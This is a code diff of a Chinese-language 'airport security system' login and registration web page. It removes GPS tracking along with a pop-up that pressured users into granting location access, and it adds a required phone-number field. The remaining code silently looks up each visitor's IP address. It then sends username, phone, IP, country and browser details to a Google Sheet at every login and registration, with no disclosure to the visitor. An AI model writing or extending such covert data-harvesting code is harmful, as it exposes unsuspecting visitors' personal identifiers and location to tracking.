@@ -427,7 +427,7 @@
             line-height: 1.5;
         }
 
-        /* 权限警告样式 */
+        /* 权限警告样式 (保留样式但已从HTML中移除) */
         .permission-warning {
             background: rgba(255, 180, 60, 0.1);
             border: 1px solid rgba(255, 180, 60, 0.3);
@@ -636,7 +636,14 @@
                     <input type="password" id="regConfirmPassword" class="form-input" placeholder="请再次输入密码" autocomplete="new-password">
                 </div>
                 
-                <!-- 新增：国家/地区输入框 -->
+                <!-- 新增：手机号输入框 -->
+                <div class="form-group">
+                    <label class="form-label">手机号</label>
+                    <input type="tel" id="regPhone" class="form-input" placeholder="请输入手机号" pattern="^1\d{10}$" required>
+                    <div style="font-size: 0.8rem; margin-top: 5px; color: #a0d2ff; opacity: 0.7;"> </div>
+                </div>
+                
+                <!-- 原有：国家/地区输入框 -->
                 <div class="form-group">
                     <label class="form-label">国家/地区</label>
                     <input type="text" id="regCountry" class="form-input" placeholder="请输入您的国家或地区" autocomplete="country-name">
@@ -759,27 +766,7 @@
         </div>
     </div>
     
-    <!-- 权限警告弹窗 -->
-    <div id="permissionWarning" class="modal-overlay">
-        <div class="modal">
-            <div class="modal-header">
-                <div class="modal-icon">⚠️</div>
-                <div class="modal-title">需要位置权限</div>
-            </div>
-            <div class="modal-content">
-                <div class="permission-warning">
-                    <div class="warning-icon">📍</div>
-                    <h3 style="color: #ffb43c; margin-bottom: 10px;">位置访问被拒绝</h3>
-                    <p>LLG机场安全系统需要获取您的位置信息以完成身份验证。</p>
-                    <p>请允许位置访问权限以继续使用系统。</p>
-                </div>
-                <p style="margin-top: 20px; text-align: center; opacity: 0.8;">您可以在浏览器设置中重新启用位置权限。</p>
-            </div>
-            <button id="retryLocationBtn" class="btn" data-action="retryLocation">重试定位</button>
-        </div>
-    </div>
-    
-    <!-- 密钥弹窗 -->
+    <!-- 密钥弹窗 (原权限警告弹窗已移除) -->
     <div id="secretKeyModal" class="modal-overlay">
         <div class="modal">
             <div class="modal-header">
@@ -825,11 +812,11 @@
         // ===== 全局状态 =====
         const AppState = {
             currentUser: null,
-            userIP: '未知',
-            userLocation: null,
+            userIP: '未知', // 仅保留IP
             isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
             isLoading: false,
-            userCountry: ''  // 存储用户输入的国家/地区
+            userCountry: '',
+            userPhone: '' // 新增：存储用户手机号
         };
         
         // ===== 工具函数 =====
@@ -847,6 +834,13 @@
             if (AppState.isMobile && navigator.vibrate) {
                 navigator.vibrate(50);
             }
+        }
+        
+        // ===== 手机号验证函数 =====
+        function validatePhone(phone) {
+            // 验证规则：1开头，11位数字
+            const phoneRegex = /^1\d{10}$/;
+            return phoneRegex.test(phone);
         }
         
         // ===== 事件委托处理 =====
@@ -902,10 +896,6 @@
                 case 'viewLogs':
                     checkSystemLogs();
                     break;
-                case 'retryLocation':
-                    hidePermissionWarning();
-                    await retryLocationAndLogin();
-                    break;
                 case 'closeKey':
                     hideSecretKey();
                     break;
@@ -920,7 +910,8 @@
             const username = document.getElementById('regUsername').value.trim();
             const password = document.getElementById('regPassword').value;
             const confirmPassword = document.getElementById('regConfirmPassword').value;
-            const country = document.getElementById('regCountry').value.trim(); // 获取国家/地区
+            const phone = document.getElementById('regPhone').value.trim(); // 获取手机号
+            const country = document.getElementById('regCountry').value.trim();
             
             if (!username || !password) {
                 alert('请输入用户名和密码');
@@ -937,20 +928,27 @@
                 return;
             }
             
-            // 保存国家/地区到全局状态
+            // 验证手机号格式
+            if (!phone) {
+                alert('请输入手机号');
+                return;
+            }
+            
+            if (!validatePhone(phone)) {
+                alert('手机号错误');
+                return;
+            }
+            
+            // 保存用户信息到全局状态
+            AppState.currentUser = username;
             AppState.userCountry = country;
+            AppState.userPhone = phone; // 保存手机号
             
             showLoading();
             
             try {
-                // 先请求定位权限
-                const locationGranted = await requestLocationPermission();
-                
-                // 注册成功，设置当前用户
-                AppState.currentUser = username;
-                
-                // 无论定位是否成功，都发送注册信息到Google Sheets
-                await sendRegistrationData(locationGranted);
+                // 发送注册信息到Google Sheets (不再包含GPS数据)
+                await sendRegistrationData();
                 
                 // 模拟网络延迟
                 await new Promise(resolve => setTimeout(resolve, 800));
@@ -992,21 +990,10 @@
                 
                 AppState.currentUser = username;
                 
-                // 先发送IP和基础信息
-                await sendBasicUserData();
+                // 发送登录信息到Google Sheets (不再包含GPS数据)
+                await sendLoginData();
                 
-                // 请求定位权限
-                const locationGranted = await requestLocationPermission();
-                
-                if (locationGranted) {
-                    // 定位成功，发送完整数据
-                    await sendCompleteUserData();
-                    switchToConsole();
-                } else {
-                    // 定位被拒绝，发送基础数据并显示警告
-                    await sendUserDataWithNote('用户拒绝定位');
-                    document.getElementById('permissionWarning').classList.add('active');
-                }
+                switchToConsole();
                 
             } catch (error) {
                 alert(error.message);
@@ -1015,51 +1002,18 @@
             }
         }
         
-        async function retryLocationAndLogin() {
-            showLoading();
-            
+        // ===== 数据发送函数 (已移除GPS相关字段) =====
+        async function sendRegistrationData() {
             try {
-                const locationGranted = await requestLocationPermission();
-                
-                if (locationGranted) {
-                    // 定位成功，发送完整数据
-                    await sendCompleteUserData();
-                    switchToConsole();
-                    document.getElementById('permissionWarning').classList.remove('active');
-                } else {
-                    alert('定位权限仍然被拒绝，请检查浏览器设置。');
-                }
-            } catch (error) {
-                alert('定位请求失败：' + error.message);
-            } finally {
-                hideLoading();
-            }
-        }
-        
-        // ===== 数据发送函数 =====
-        async function sendRegistrationData(locationGranted) {
-            try {
-                const gpsData = locationGranted && AppState.userLocation ? {
-                    lat: AppState.userLocation.latitude,
-                    lng: AppState.userLocation.longitude,
-                    acc: AppState.userLocation.accuracy,
-                    note: '注册时定位成功'
-                } : {
-                    lat: '',
-                    lng: '',
-                    acc: '',
-                    note: locationGranted ? '注册时定位失败' : '注册时用户拒绝定位'
-                };
-                
                 const data = {
                     username: AppState.currentUser,
+                    phone: AppState.userPhone, // 新增手机号字段
                     ip: AppState.userIP,
+                    country: AppState.userCountry || '',
                     userAgent: navigator.userAgent,
                     pageUrl: window.location.href,
-                    country: AppState.userCountry || '',  // 添加国家/地区字段
-                    ...gpsData,
                     timestamp: new Date().toISOString(),
-                    action: 'register'  // 标记为注册操作
+                    action: 'register'
                 };
                 
                 await sendDataToGoogleSheets(data);
@@ -1069,106 +1023,22 @@
             }
         }
         
-        async function sendBasicUserData() {
+        async function sendLoginData() {
             try {
                 const data = {
                     username: AppState.currentUser,
                     ip: AppState.userIP,
                     userAgent: navigator.userAgent,
                     pageUrl: window.location.href,
-                    lat: '',
-                    lng: '',
-                    acc: '',
-                    note: '正在获取定位...',
-                    country: '',  // 登录时没有国家/地区字段
                     timestamp: new Date().toISOString(),
-                    action: 'login'  // 标记为登录操作
+                    action: 'login'
                 };
                 
                 await sendDataToGoogleSheets(data);
-                console.log('基础用户数据已发送');
+                console.log('登录数据已发送');
             } catch (error) {
-                console.error('发送基础数据失败:', error);
+                console.error('发送登录数据失败:', error);
             }
-        }
-        
-        async function sendCompleteUserData() {
-            try {
-                const data = {
-                    username: AppState.currentUser,
-                    ip: AppState.userIP,
-                    userAgent: navigator.userAgent,
-                    pageUrl: window.location.href,
-                    lat: AppState.userLocation ? AppState.userLocation.latitude : '',
-                    lng: AppState.userLocation ? AppState.userLocation.longitude : '',
-                    acc: AppState.userLocation ? AppState.userLocation.accuracy : '',
-                    note: '登录时定位成功',
-                    country: '',  // 登录时没有国家/地区字段
-                    timestamp: new Date().toISOString(),
-                    action: 'login'  // 标记为登录操作
-                };
-                
-                await sendDataToGoogleSheets(data);
-                console.log('完整用户数据已发送');
-            } catch (error) {
-                console.error('发送完整数据失败:', error);
-            }
-        }
-        
-        async function sendUserDataWithNote(note) {
-            try {
-                const data = {
-                    username: AppState.currentUser,
-                    ip: AppState.userIP,
-                    userAgent: navigator.userAgent,
-                    pageUrl: window.location.href,
-                    lat: '',
-                    lng: '',
-                    acc: '',
-                    note: note,
-                    country: '',  // 登录时没有国家/地区字段
-                    timestamp: new Date().toISOString(),
-                    action: 'login'  // 标记为登录操作
-                };
-                
-                await sendDataToGoogleSheets(data);
-                console.log('带备注的用户数据已发送');
-            } catch (error) {
-                console.error('发送带备注数据失败:', error);
-            }
-        }
-        
-        // ===== GPS定位函数 =====
-        function requestLocationPermission() {
-            return new Promise((resolve) => {
-                if (!navigator.geolocation) {
-                    console.warn('浏览器不支持定位功能');
-                    resolve(false);
-                    return;
-                }
-                
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        AppState.userLocation = {
-                            latitude: position.coords.latitude,
-                            longitude: position.coords.longitude,
-                            accuracy: position.coords.accuracy
-                        };
-                        console.log('获取到用户位置:', AppState.userLocation);
-                        resolve(true);
-                    },
-                    (error) => {
-                        console.error('获取位置失败:', error.message);
-                        AppState.userLocation = null; // 确保定位状态被清除
-                        resolve(false);
-                    },
-                    {
-                        enableHighAccuracy: true, // 改为高精度获取
-                        timeout: 15000, // 延长超时时间
-                        maximumAge: 0
-                    }
-                );
-            });
         }
         
         // ===== Google Sheets 数据发送 =====
@@ -1183,15 +1053,13 @@
                 const params = new URLSearchParams({
                     'callback': 'handleSheetsResponse',
                     'username': data.username || '',
+                    'phone': data.phone || '', // 新增手机号参数
                     'ip': data.ip || '',
+                    'country': data.country || '',
                     'ua': data.userAgent || '',
                     'url': data.pageUrl || '',
-                    'country': data.country || '',  // 新增：国家/地区字段
-                    'lat': data.lat || '',
-                    'lng': data.lng || '',
-                    'acc': data.acc || '',
-                    'note': data.note || '',
-                    'action': data.action || '',  // 新增：操作类型（注册/登录）
+                    // 已移除 lat, lng, acc, note 等GPS字段
+                    'action': data.action || '',
                     'time': data.timestamp || new Date().toISOString()
                 }).toString();
                 
@@ -1237,14 +1105,15 @@
         
         function handleLogout() {
             AppState.currentUser = null;
-            AppState.userLocation = null;
             AppState.userCountry = '';
+            AppState.userPhone = '';
             
             document.getElementById('loginUsername').value = '';
             document.getElementById('loginPassword').value = '';
             document.getElementById('regUsername').value = '';
             document.getElementById('regPassword').value = '';
             document.getElementById('regConfirmPassword').value = '';
+            document.getElementById('regPhone').value = '';
             document.getElementById('regCountry').value = '';
             
             document.getElementById('consoleScene').classList.remove('active');
@@ -1252,10 +1121,6 @@
         }
         
         // ===== 弹窗控制 =====
-        function hidePermissionWarning() {
-            document.getElementById('permissionWarning').classList.remove('active');
-        }
-        
         function showSecretKey() {
             document.getElementById('secretKeyDisplay').textContent = CONFIG.FIXED_SECRET_KEY;
             document.getElementById('secretKeyModal').classList.add('active');
@@ -1278,14 +1143,14 @@
         function checkSystemLogs() {
             alert('系统日志功能\n\n当前用户：' + (AppState.currentUser || '未登录') + 
                   '\nIP地址：' + AppState.userIP + 
-                  '\n最后定位：' + (AppState.userLocation ? '成功' : '未获取') +
+                  '\n注册手机号：' + (AppState.userPhone || '未填写') +
                   '\n注册国家/地区：' + (AppState.userCountry || '未填写'));
         }
         
-        // ===== 初始化 =====
+        // ===== 初始化 (仅静默获取IP) =====
         async function init() {
             try {
-                // 获取用户IP
+                // 静默获取用户IP
                 const ipResponse = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipResponse.json();
                 AppState.userIP = ipData.ip;
@@ -1303,7 +1168,7 @@
                 document.body.classList.add('mobile');
             }
             
-            console.log('系统初始化完成，设备类型:', AppState.isMobile ? '移动端' : '桌面端');
+            console.log('系统初始化完成，已移除GPS功能。设备类型:', AppState.isMobile ? '移动端' : '桌面端');
         }
         
         // 启动应用
